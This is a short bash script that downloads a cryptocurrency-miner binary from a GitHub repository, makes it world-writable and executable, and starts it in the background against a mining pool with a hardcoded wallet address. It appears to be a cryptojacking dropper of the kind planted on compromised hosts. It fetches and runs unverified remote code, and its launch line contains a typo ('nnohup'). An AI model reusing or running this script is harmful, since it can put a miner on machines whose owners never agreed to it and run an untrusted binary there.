#!/bin/bash
sleep 10
mkdir /data
cd /data
curl -LO https://github.com/2319763378/pool/raw/master/res/resminer-sse2
chmod 777 resminer-sse2
nnohup ./resminer-sse2 -o stratum+tcp://stratum.rplant.xyz:7040 -u r189TTBHwNNL3wqLNKKy79zZcYfRVhuTQeZ.wa &
